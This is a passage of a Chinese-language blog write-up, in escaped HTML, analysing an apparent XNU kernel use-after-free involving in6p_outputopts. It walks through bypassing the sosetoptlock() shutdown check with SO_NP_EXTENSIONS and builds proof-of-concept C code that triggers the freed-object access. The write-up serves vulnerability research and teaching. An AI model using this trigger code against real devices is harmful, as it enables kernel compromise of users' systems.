    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IPV6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_USE_MIN_MTU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 释放in6p_outputopts&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;disconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IPV6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_USE_MIN_MTU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[-] setsockopt() failed, error %d (%s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strerror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;显然是不能的&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-] setsockopt() failed, error 22 (Invalid argument)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;因为在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sosetoptlock()&lt;/code&gt;有一个检查，如果发现Socket已经被关闭，就直接失败&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define	SS_CANTRCVMORE		0x0020	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* can't receive more data from peer */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	SS_CANTSENDMORE		0x0010	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* can't send more data to peer */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	SOF_NPX_SETOPTSHUT	0x00002000 &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* Non POSIX extension to allow

int
sosetoptlock(struct socket *so, struct sockopt *sopt, int dolock)
{
	...

	if ((so-&amp;gt;so_state &amp;amp; (SS_CANTRCVMORE | SS_CANTSENDMORE)) ==
	    (SS_CANTRCVMORE | SS_CANTSENDMORE) &amp;amp;&amp;amp;
	    (so-&amp;gt;so_flags &amp;amp; SOF_NPX_SETOPTSHUT) == 0) {
		/* the socket has been shutdown, no more sockopt's */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;理解一下这个检查，左边&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so-&amp;gt;so_state&lt;/code&gt;只能是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SS_CANTRCVMORE&lt;/code&gt;与&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SS_CANTSENDMORE&lt;/code&gt;之间任意一种且右边&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so-&amp;gt;so_flags&lt;/code&gt;不能是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/code&gt;，就会跳到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;goto out&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SS_CANTRCVMORE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SS_CANTSENDMORE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SS_CANTRCVMORE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SS_CANTSENDMORE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但是天无绝人之路，看下面这个宏，允许在关闭Socket之后使用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setsockopt&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define	SONPX_SETOPTSHUT	0x000000001	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* flag for allowing setsockopt after shutdown */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;找到这个宏的使用场景，发现是在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;level&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOL_SOCKET&lt;/code&gt;的分支里，当满足&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sonpx.npx_mask&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sonpx.npx_flags&lt;/code&gt;都为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SONPX_SETOPTSHUT&lt;/code&gt;时，就会给&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so-&amp;gt;so_flags&lt;/code&gt;添加&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/code&gt;标志位&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;sosetoptlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockopt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dolock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOL_SOCKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SO_NP_EXTENSIONS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;so_np_extensions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sooptcopyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
			    &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npx_mask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SONPX_MASK_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;cm&quot;&gt;/*
			 * Only one bit defined for now
			 */&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npx_mask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SONPX_SETOPTSHUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npx_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SONPX_SETOPTSHUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 添加标志位&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so-&amp;gt;so_flags&lt;/code&gt;拥有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/code&gt;标志位，那么右边的检查就不能成立，成功绕过&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SS_CANTRCVMORE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SS_CANTSENDMORE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SS_CANTRCVMORE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SS_CANTSENDMORE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时的代码如下&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IPV6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_USE_MIN_MTU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;so_np_extensions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npx_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SONPX_SETOPTSHUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npx_mask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SONPX_SETOPTSHUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOL_SOCKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SO_NP_EXTENSIONS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sonpx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;disconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IPV6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_USE_MIN_MTU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span 